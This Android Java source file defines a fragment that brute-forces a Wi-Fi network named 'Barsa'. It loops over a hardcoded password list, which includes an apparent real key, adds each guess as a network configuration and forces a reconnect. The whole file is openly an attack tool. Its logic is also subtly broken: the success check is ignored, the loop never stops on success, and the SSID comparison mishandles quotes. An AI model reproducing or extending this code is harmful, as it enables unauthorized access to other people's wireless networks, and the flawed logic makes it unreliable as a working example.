package BruteFragment;

import android.content.Context;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;

import LogFragment.LogFragment;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import logic.ShowToast;

import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.TextView;

import com.linkclink.gfr.R;

public class BruteFragment extends Fragment {

    private String currentBruteSSID = "Barsa";
    private String networkPass = "brat22AA";

    private String[] passwordTable = {"12345", "dsadsadsa", "brat22AA", "fsdfdfsfdssf"};

    int netId = 0;


    private LayoutInflater inflater;
    private ViewGroup container;

    private View view;

    private Button buttonBrute;
    private Button buttonBruteAll;

    private WifiManager wifiManager;
    WifiInfo wifiInfo;
    private WifiConfiguration wifiConfiguration;

    private int flagStartBrute;

    private String ssid;

    public static BruteFragment newInstance() {
        return new BruteFragment();
    }

    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {

        this.container = container;
        this.inflater = inflater;

        wifiManager = (WifiManager) getContext().getApplicationContext().getSystemService(Context.WIFI_SERVICE);

        InitialisationComponents();

        buttonBrute.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Brute();
            }
        });

        return view;
    }

    private void InitialisationComponents() {
        view = inflater.inflate(R.layout.brute_fragment, container, false);
        buttonBrute = (Button) view.findViewById(R.id.button_brute);
        buttonBruteAll = (Button) view.findViewById(R.id.button_bruteAll);
    }

    private void Brute() {
        ShowToast.showToast(getContext(),"Start brute wifi: " + currentBruteSSID);


        for (int i = 0; i < passwordTable.length; i++)
        {

            /* Remove wifi */
            if (netId != 0) wifiManager.removeNetwork(netId);

            /* Config */
            wifiConfiguration = new WifiConfiguration();
            wifiConfiguration.SSID = String.format("\"%s\"", currentBruteSSID);
            wifiConfiguration.preSharedKey = String.format("\"%s\"", passwordTable[i]);
            /*  */

            netId = wifiManager.addNetwork(wifiConfiguration);

            wifiManager.disconnect();
            wifiManager.enableNetwork(netId, true);
            wifiManager.reconnect();

            CheckSuccessConnect();

        }
    }

    private boolean CheckSuccessConnect() {

        // e.g. To check the Network Name or other info:
        wifiInfo = wifiManager.getConnectionInfo();

        ssid = wifiInfo.getSSID();

        if (currentBruteSSID.equals(ssid))
        {
            return true;
        }

        return false;
    }
}
